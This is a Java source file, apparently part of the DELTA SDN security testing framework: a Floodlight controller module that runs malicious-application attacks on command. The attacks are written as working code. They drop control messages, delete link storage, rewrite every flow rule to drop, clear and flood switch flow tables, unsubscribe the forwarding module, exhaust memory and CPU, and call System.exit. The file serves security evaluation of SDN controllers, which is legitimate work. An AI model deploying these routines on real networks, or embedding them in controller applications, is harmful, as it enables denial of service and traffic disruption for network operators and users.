package org.deltaproject.appagent;

import com.google.common.util.concurrent.ListenableFuture;
import net.floodlightcontroller.core.FloodlightContext;
import net.floodlightcontroller.core.IFloodlightProviderService;
import net.floodlightcontroller.core.IOFMessageListener;
import net.floodlightcontroller.core.IOFSwitch;
import net.floodlightcontroller.core.IShutdownService;
import net.floodlightcontroller.core.internal.IOFSwitchService;
import net.floodlightcontroller.core.module.FloodlightModuleContext;
import net.floodlightcontroller.core.module.FloodlightModuleException;
import net.floodlightcontroller.core.module.IFloodlightModule;
import net.floodlightcontroller.core.module.IFloodlightService;
import net.floodlightcontroller.debugcounter.IDebugCounterService;
import net.floodlightcontroller.debugevent.IDebugEventService;
import net.floodlightcontroller.devicemanager.IDeviceService;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
import net.floodlightcontroller.packet.Ethernet;
import net.floodlightcontroller.packet.IPacket;
import net.floodlightcontroller.packet.IPv4;
import net.floodlightcontroller.restserver.IRestApiService;
import net.floodlightcontroller.staticflowentry.IStaticFlowEntryPusherService;
import net.floodlightcontroller.storage.IResultSet;
import net.floodlightcontroller.storage.IStorageSourceService;
import net.floodlightcontroller.storage.memory.MemoryStorageSource;
import net.floodlightcontroller.threadpool.IThreadPoolService;
import org.projectfloodlight.openflow.protocol.OFFactory;
import org.projectfloodlight.openflow.protocol.OFFlowAdd;
import org.projectfloodlight.openflow.protocol.OFFlowDelete;
import org.projectfloodlight.openflow.protocol.OFFlowMod;
import org.projectfloodlight.openflow.protocol.OFFlowStatsEntry;
import org.projectfloodlight.openflow.protocol.OFFlowStatsReply;
import org.projectfloodlight.openflow.protocol.OFMessage;
import org.projectfloodlight.openflow.protocol.OFPacketIn;
import org.projectfloodlight.openflow.protocol.OFStatsReply;
import org.projectfloodlight.openflow.protocol.OFStatsRequest;
import org.projectfloodlight.openflow.protocol.OFStatsType;
import org.projectfloodlight.openflow.protocol.OFType;
import org.projectfloodlight.openflow.protocol.action.OFAction;
import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
import org.projectfloodlight.openflow.protocol.match.Match;
import org.projectfloodlight.openflow.protocol.match.MatchField;
import org.projectfloodlight.openflow.types.DatapathId;
import org.projectfloodlight.openflow.types.EthType;
import org.projectfloodlight.openflow.types.MacAddress;
import org.projectfloodlight.openflow.types.OFPort;
import org.projectfloodlight.openflow.types.TableId;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;


public class AppAgent implements IFloodlightModule, IOFMessageListener {
    class CPU extends Thread {
        int result = 1;

        @Override
        public void run() {
            // TODO Auto-generated method stub
            while (true) {
                try {
                    Thread.sleep(1);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                result = result ^ 2;
            }
        }
    }

    protected static Logger logger = LoggerFactory.getLogger(AppAgent.class);

    private short FLOWMOD_DEFAULT_IDLE_TIMEOUT = (short) 0;
    private short FLOWMOD_DEFAULT_HARD_TIMEOUT = (short) 0;

    private static final String LINK_TABLE_NAME = "controller_link";
    private static final String LINK_ID = "id";

    protected IFloodlightProviderService floodlightProvider;

    protected IStorageSourceService storageSource;
    protected IDeviceService dservice;
    protected ILinkDiscoveryService linkDiscoveryService;
    protected IThreadPoolService threadPoolService;
    protected IOFSwitchService switchService;
    protected IRestApiService restApiService;
    protected IDebugCounterService debugCounterService;
    protected IDebugEventService debugEventService;
    protected IShutdownService shutdownService;

    protected MemoryStorageSource mt;
    static long[][] ary;
    protected OFFlowMod benign_flow;
    protected short benign_inport;

    private boolean isDrop;
    private boolean isLoop;
    private boolean isRemovedPayload;

    private OFPacketIn droppedPacket;

    private SystemTime sys;
    private HashMap<String, Integer> map = new HashMap<>();

    private IStaticFlowEntryPusherService fservice;
    private Interface cm;

    private int flownum;

    public String getName() {
        // TODO Auto-generated method stub
        return AppAgent.class.getSimpleName();
    }

    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleServices() {
        Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
        // l.add(ILinkDiscoveryService.class);
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Map<Class<? extends IFloodlightService>, IFloodlightService> getServiceImpls() {

        // TODO Auto-generated method stub
        // Map<Class<? extends IFloodlightService>, IFloodlightService> m = new
        // HashMap<Class<? extends IFloodlightService>, IFloodlightService>();
        // m.put(ILinkDiscoveryService.class, this);
        return null;
    }

    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleDependencies() {
        Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
        l.add(IFloodlightProviderService.class);
        l.add(ILinkDiscoveryService.class);
        l.add(IThreadPoolService.class);
        l.add(IOFSwitchService.class);
        l.add(IDebugCounterService.class);
        l.add(IDebugEventService.class);
        l.add(IRestApiService.class);
        l.add(IShutdownService.class);

        return l;
    }

    @Override
    public void init(FloodlightModuleContext context)
            throws FloodlightModuleException {
        // TODO Auto-generated method stub

        floodlightProvider = context
                .getServiceImpl(IFloodlightProviderService.class);

        mt = context.getServiceImpl(MemoryStorageSource.class);

        dservice = context.getServiceImpl(IDeviceService.class);
        fservice = context.getServiceImpl(IStaticFlowEntryPusherService.class);
        switchService = context.getServiceImpl(IOFSwitchService.class);
        storageSource = context.getServiceImpl(IStorageSourceService.class);
        threadPoolService = context.getServiceImpl(IThreadPoolService.class);
        restApiService = context.getServiceImpl(IRestApiService.class);
        debugCounterService = context
                .getServiceImpl(IDebugCounterService.class);
        debugEventService = context.getServiceImpl(IDebugEventService.class);
        shutdownService = context.getServiceImpl(IShutdownService.class);
        linkDiscoveryService = context
                .getServiceImpl(ILinkDiscoveryService.class);

        cm = new Interface(this);
        cm.start();
    }

    @Override
    public void startUp(FloodlightModuleContext context)
            throws FloodlightModuleException {
        // TODO Auto-generated method stub
        floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);

        /*
        floodlightProvider.addOFMessageListener(OFType.FLOW_REMOVED, this);
        floodlightProvider.addOFMessageListener(OFType.ERROR, this);

        floodlightProvider.addOFMessageListener(OFType.BARRIER_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.BARRIER_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.ECHO_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.ECHO_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.FEATURES_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.FEATURES_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.FLOW_MOD, this);
        floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REPLY, this);
        floodlightProvider
                .addOFMessageListener(OFType.GET_CONFIG_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.HELLO, this);
        floodlightProvider.addOFMessageListener(OFType.PACKET_OUT, this);
        floodlightProvider.addOFMessageListener(OFType.PORT_MOD, this);
        floodlightProvider.addOFMessageListener(OFType.PORT_STATUS, this);
        floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REPLY,
                this);
        floodlightProvider.addOFMessageListener(
                OFType.QUEUE_GET_CONFIG_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.SET_CONFIG, this);
        floodlightProvider.addOFMessageListener(OFType.STATS_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.STATS_REQUEST, this);
        */
    }

    @Override
    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
        // System.out.println("[App-Agent] receive message " + msg.toString() + isDrop);

        // TODO Auto-generated method stub
        switch (msg.getType()) {
            case PACKET_IN:
                // System.out.println("[App-Agent] receive message " + msg.toString() + " " + isDrop);

                OFPacketIn pi = (OFPacketIn) msg;
                Ethernet eth = IFloodlightProviderService.bcStore.get(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);

                IPacket pkt = eth.getPayload();
                IPv4 ip_pkt = null;

                if (isDrop) {
                    System.out.println("[App-Agent] Drop message " + msg.toString());

                    if (droppedPacket == null)
                        droppedPacket = pi;

                    return Command.STOP;
                } else if (isLoop) {
                    this.testInfiniteLoop();
                } else if (isRemovedPayload) {
                    IFloodlightProviderService.bcStore.remove(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
                }

                return Command.CONTINUE;
        }

        return Command.CONTINUE;
    }


    public boolean setControlMessageDrop() {
        System.out.println("[App-Agent] Set Control_Message_Drop");
        isDrop = true;

        List<IOFMessageListener> listeners = floodlightProvider.getListeners()
                .get(OFType.PACKET_IN);

        IOFMessageListener temp = null;
        for (IOFMessageListener listen : listeners) {
            if (listen.getName().equals("AppAgent")) {
                temp = listen;
            }

            floodlightProvider
                    .removeOFMessageListener(OFType.PACKET_IN, listen);
        }

        for (IOFMessageListener listen : listeners) {
            floodlightProvider.addOFMessageListener(OFType.PACKET_IN, temp);
            if (!listen.getName().equals("AppAgent")) {
                floodlightProvider.addOFMessageListener(OFType.PACKET_IN,
                        listen);
            }
        }

        listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);

        for (IOFMessageListener listen : listeners) {
            System.out.println("[App-Agent] Modified PACKET_IN listener: " + listen.getName());
        }

        return true;
    }

    public String testControlMessageDrop() {
        System.out.println("[App-Agent] Test Control_Message_Drop");
        String drop = "null";

        if (droppedPacket != null) {
            drop = droppedPacket.toString();
            System.out.println("[App-Agent] Send dropped msg : " + drop);
        }

        return drop;
    }

    public boolean setInfiniteLoop() {
        System.out.println("[App-Agent] Set_Infinite_Loop");
        this.isLoop = true;

        return true;
    }

    public static boolean testInfiniteLoop() {
        System.out.println("[App-Agent] Infinite_Loop");
        int i = 0;

        while (i < 100) {
            i++;

            if (i == 99)
                i = 0;
        }

        return true;
    }

    public String testInternalStorageAbuse() {
        System.out.println("[App-Agent] Internal Storage Manipulation");
        String deletedInfo = "nothing";
        List<String> linkIdList = new LinkedList<String>();
        int count = 0;

        IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
                null, null);

        while (link.next()) {
            try {
                count++;
                linkIdList.add(link.getString(LINK_ID));
            } catch (NullPointerException e) {
                e.printStackTrace();
            }
        }

        if (0 < count) {
            deletedInfo = "success|";
            storageSource.deleteRowsAsync(LINK_TABLE_NAME, null);
        }

        for (int i = 0; i < count; i++) {
            System.out.println("[App-Agent] Access InternalDB : delete Link Information");
            System.out.println("[App-Agent] delete Link Info: " + linkIdList.get(i));
            deletedInfo += linkIdList.get(i).toString() + "\n";
        }

        return deletedInfo;
    }

    public String testFlowRuleModification() {
        System.out.println("[App-Agent] Flow_Rule_Modification");

        String result = "nothing";

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        for (DatapathId sw : switchService.getAllSwitchDpids()) {
            switches.add(switchService.getSwitch(sw));
        }

        for (IOFSwitch sw : switches) {
            List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);

            if (flowTable != null) {
                for (OFStatsReply flow : flowTable) {
                    OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
                    List<OFFlowStatsEntry> entries = fsr.getEntries();

                    if (entries != null) {
                        for (OFFlowStatsEntry e : entries) {
                            OFActionOutput.Builder aob = sw.getOFFactory().actions().buildOutput();
                            List<OFAction> actions = new ArrayList<OFAction>();
                            actions.add(aob.build());

                            OFFlowMod.Builder fmb = sw.getOFFactory().buildFlowModify();
                            fmb.setMatch(e.getMatch());
                            fmb.setActions(actions);
                            fmb.setPriority(2);

                            sw.write(fmb.build());

                            result = "success|" + e.toString() + " -> " + "DROP";
                        }
                    }
                }
            }
        }
        return result;
    }


    public void testFlowTableClearance(boolean isLoop) {
        System.out.println("[App-Agent] Flow_Table_Clearance");

        int cnt = 1;

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();

        for (DatapathId sw : switchService.getAllSwitchDpids()) {
            switches.add(switchService.getSwitch(sw));
        }

        for (int i = 0; i < cnt; i++) {
            for (IOFSwitch sw : switches) {
                List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);

                if (flowTable != null) {
                    for (OFStatsReply flow : flowTable) {
                        OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
                        List<OFFlowStatsEntry> entries = fsr.getEntries();

                        if (entries != null) {
                            for (OFFlowStatsEntry e : entries) {
                                OFFlowMod.Builder fmb = sw.getOFFactory().buildFlowDelete();
                                fmb.setMatch(e.getMatch());
                                fmb.setPriority(2);

                                sw.write(fmb.build());
                            }
                        }
                    }
                }

                if (isLoop)
                    i = -1;
            }
        }
    }

    public String testEventListenerUnsubscription() {
        List<IOFMessageListener> listeners = floodlightProvider.getListeners()
                .get(OFType.PACKET_IN);

        String removed = "";
        for (IOFMessageListener listen : listeners) {
            System.out.println("[App-Agent] PACKET_IN LIST");
            System.out.println("[App-Agent] " + listen.getName());
        }

        for (IOFMessageListener listen : listeners) {
            if (listen.getName().equals("forwarding")) {
                System.out.println("\n\n[App-Agent] REMOVE: " + listen.getName());

                removed = "forwarding";
                floodlightProvider.removeOFMessageListener(OFType.PACKET_IN,
                        listen);
            }
        }
        return removed;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[App-Agent] Resource Exhausion : Mem");
        ArrayList<long[][]> arry;
        // ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
        arry = new ArrayList<long[][]>();
        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    public boolean testResourceExhaustionCPU() {
        System.out.println("[App-Agent] Resource Exhausion : CPU");

        for (int count = 0; count < 100; count++) {
            CPU cpu_thread = new CPU();
            cpu_thread.start();
        }

        return true;
    }

    public boolean testSystemVariableManipulation() {
        System.out.println("[App-Agent] System_Variable_Manipulation");
        this.sys = new SystemTime();
        sys.start();
        return true;
    }

    public boolean testSystemCommandExecution() {
        System.out.println("[App-Agent] System_Command_Execution");
        System.exit(0);

        return true;
    }

    public String testLinkFabrication() {
        System.out.println("[App-Agent] Internal Storage Manipulation");
        String fakeLinks = "";

        boolean a = false, b = false;

        List<String> linkIdList = new LinkedList<String>();
        int count = 0;

        IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
                null, null);

        while (link.next()) {
            try {
                count++;
                linkIdList.add(link.getString(LINK_ID));
            } catch (NullPointerException e) {
                e.printStackTrace();
            }
        }

        for (int i = 0; i < count; i++) {
            System.out.println("[App-Agent] Link Info: " + linkIdList.get(i));

            if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:01-2-00:00:00:00:00:00:00:03-2")) {
                fakeLinks += linkIdList.get(i).toString() + "\n";
                a = true;
            }

            if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:03-2-00:00:00:00:00:00:00:01-2")) {
                fakeLinks += linkIdList.get(i).toString() + "\n";
                b = true;
            }
        }

        if (a && b) {
            fakeLinks = "success|\n Fake links: " + fakeLinks;
        } else
            fakeLinks = "nothing";

        return fakeLinks;
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[App-Agent] Flow Rule Flooding attack");

        OFFactory of = null;

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        for (DatapathId sw : switchService.getAllSwitchDpids()) {
            switches.add(switchService.getSwitch(sw));
            of = switchService.getSwitch(sw).getOFFactory();
        }

        Random random = new Random();

        for (int i = 0; i < 32767; i++) {
            OFActionOutput.Builder aob = of.actions().buildOutput();
            List<OFAction> actions = new ArrayList<OFAction>();
            actions.add(aob.build());

            OFFlowMod.Builder fmb = of.buildFlowAdd();

            Match.Builder mb = of.buildMatch();
            mb.setExact(MatchField.IN_PORT, OFPort.of(1));
            mb.setExact(MatchField.ETH_DST, MacAddress.of(random.nextLong()));
            mb.setExact(MatchField.ETH_SRC, MacAddress.of(random.nextLong()));

            fmb.setMatch(mb.build());
            fmb.setActions(actions);
            fmb.setPriority(random.nextInt(32767));

            for (IOFSwitch sw : switches) {
                sw.write(fmb.build());
            }
        }

        return true;
    }


    public String testSwitchFirmwareMisuse() {
        String result = "nothing";

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        for (DatapathId sw : switchService.getAllSwitchDpids()) {
            switches.add(switchService.getSwitch(sw));
        }

        for (IOFSwitch sw : switches) {
            List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);

            if (flowTable != null) {
                for (OFStatsReply flow : flowTable) {
                    OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
                    List<OFFlowStatsEntry> entries = fsr.getEntries();

                    if (entries != null) {
                        for (OFFlowStatsEntry e : entries) {
                            Match m = e.getMatch();
                            if (!(m.isExact(MatchField.IN_PORT) &&
                                    m.isExact(MatchField.ETH_TYPE) &&
                                    m.isExact(MatchField.ETH_DST) &&
                                    m.isExact(MatchField.ETH_SRC) &&
                                    m.isExact(MatchField.IPV4_SRC) &&
                                    m.isExact(MatchField.IPV4_SRC))) {
                                continue;
                            }

                            String ofver = sw.getOFFactory().getVersion().toString();

                            OFFlowDelete.Builder delete = sw.getOFFactory().buildFlowDelete();
                            delete.setMatch(e.getMatch());
                            sw.write(delete.build());

                            OFFlowAdd.Builder add = sw.getOFFactory().buildFlowAdd();
                            add.setPriority(e.getPriority() + 1);

                            Match.Builder mb = sw.getOFFactory().buildMatch();
                            mb.setExact(MatchField.ETH_TYPE, EthType.of(0x0800));
                            mb.setExact(MatchField.IN_PORT, e.getMatch().get(MatchField.IN_PORT));
                            mb.setExact(MatchField.IPV4_DST, e.getMatch().get(MatchField.IPV4_DST));
                            mb.setExact(MatchField.IPV4_SRC, e.getMatch().get(MatchField.IPV4_SRC));

                            add.setMatch(mb.build());
                            add.setActions(e.getActions());
                            sw.write(add.build());

                            result += add.toString();
                        }
                    }
                }
            }
        }

        return result;
    }

    public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {
        logger.info("[App-Agent] Send UnFlagged Flow Remove Message");

        OFFactory of = null;
        IOFSwitch sw = null;

        if (switchService.getAllSwitchDpids().iterator().hasNext()) {
            sw = switchService.getSwitch(switchService.getAllSwitchDpids().iterator().next());
            of = sw.getOFFactory();
        } else {
            return "no connected switch";
        }

        if (cmd.contains("install")) {

            OFActionOutput.Builder aob = of.actions().buildOutput();
            aob.setPort(OFPort.of(2));
            List<OFAction> actions = new ArrayList<>();
            actions.add(aob.build());

            OFFlowMod.Builder fmb = of.buildFlowAdd();

            Match.Builder mb = of.buildMatch();
            mb.setExact(MatchField.IN_PORT, OFPort.of(1));
            mb.setExact(MatchField.ETH_DST, MacAddress.of("00:00:00:00:00:11"));
            mb.setExact(MatchField.ETH_SRC, MacAddress.of("00:00:00:00:00:22"));
            fmb.setMatch(mb.build());
            fmb.setActions(actions);
            fmb.setPriority(555);

            OFFlowMod msg = fmb.build();
            sw.write(msg);

            logger.info("install a flow {} to the device {}", msg, sw);

            return "Installed flow rule id|";

        } else if (cmd.contains("check")) {

            Boolean result = true;

            if (sw.getTables().iterator().hasNext()) {
                TableId next = sw.getTables().iterator().next();

            }

            if (result) {
                return "success";
            } else {
                return "fail";
            }
        }

        return "fail";
    }


    public void blockLLDPPacket() {
        /* for (DatapathId sw : switchService.getAllSwitchDpids()) {
            IOFSwitch iofSwitch = switchService.getSwitch(sw);
            // if (iofSwitch == null)
            // continue;
            // if (!iofSwitch.isActive())
            // continue; /* can't do anything if the switch is SLAVE
            if (iofSwitch.getEnabledPorts() != null) {
                for (OFPortDesc ofp : iofSwitch.getEnabledPorts()) {
                    this.linkDiscoveryService.AddToSuppressLLDPs(sw,
                            ofp.getPortNo());
                    System.out.println("Blocking");

                }
            }
        }

         List<String> list = debugEventService.getModuleList();
         for (String s : list) {
         System.out.println("module: " + s);
         }
         List<EventInfoResource> elist =
         debugEventService.getAllEventHistory();
         for(EventInfoResource e : elist) {
         System.out.println("event :"+e.toString());
         }
         ScheduledExecutorService ses = threadPoolService.getScheduledExecutor(); */
    }


    // Get flow table in the switch
    protected List<OFStatsReply> getSwitchStatistics(IOFSwitch sw, OFStatsType statsType) {
        ListenableFuture<?> future;
        List<OFStatsReply> values = null;
        Match match;

        if (sw != null) {
            OFStatsRequest<?> req = null;
            switch (statsType) {
                case FLOW:
                    match = sw.getOFFactory().buildMatch().build();
                    req = sw.getOFFactory().buildFlowStatsRequest()
                            .setMatch(match)
                            .setOutPort(OFPort.ANY)
                            .setTableId(TableId.ALL)
                            .build();
                    break;
            }

            try {
                if (req != null) {
                    future = sw.writeStatsRequest(req);
                    values = (List<OFStatsReply>) future.get(1, TimeUnit.SECONDS);
                }
            } catch (Exception e) {
                logger.error("Failure retrieving statistics from switch {}. {}", sw, e);
            }
        }

        return values;
    }

    public void testSwappingList() {
        List<IOFMessageListener> packetin_listeners = floodlightProvider
                .getListeners().get(OFType.PACKET_IN);

        System.out.println("[App-Agent] List of Packet-In Listener: " + packetin_listeners.size());

        int cnt = 1;

        for (IOFMessageListener listen : packetin_listeners) {
            System.out.println("[App-Agent] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
        }

        IOFMessageListener temp = packetin_listeners.get(0);
        packetin_listeners.set(packetin_listeners.size() - 1, temp);
        packetin_listeners.set(0, this);

        cnt = 1;

        System.out.println("[App-Agent] List of Packet-In Listener: " + packetin_listeners.size());

        for (IOFMessageListener listen : packetin_listeners) {
            System.out.println("[App-Agent] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
        }

        isRemovedPayload = true;
    }

    @Override
    public boolean isCallbackOrderingPrereq(OFType type, String name) {
        return (type.equals(OFType.PACKET_IN) && (name.equals("topology") || name.equals("devicemanager")));
    }

    @Override
    public boolean isCallbackOrderingPostreq(OFType type, String name) {
        return false;
    }
}
